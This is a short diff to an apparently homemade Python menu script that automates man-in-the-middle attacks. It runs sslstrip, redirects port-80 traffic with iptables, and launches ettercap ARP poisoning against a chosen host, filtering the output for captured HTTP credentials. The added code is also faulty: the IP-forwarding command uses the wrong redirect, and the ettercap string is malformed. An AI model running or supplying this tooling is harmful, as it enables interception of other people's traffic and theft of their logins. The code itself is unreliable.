@@ -19,7 +19,18 @@ def options():
         os.system("sslstrip -a -l 4003")
     elif option == 2:
         host = input("Set IP Host:")
-        
+        os.system("echo 1 < /proc/sys/net/ipv4/ip_forward")
+        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 4003")
+        os.system("ettercap -TqM ARP:REMOTE //+"host+"/ | grep 'HTTP : ' ")
+    
+    elif option == 0:
+        print("Thank You For Using My Script")
+        quit()
+
+    else:
+        print("option not found")
+        options()
+options()
 
 
 
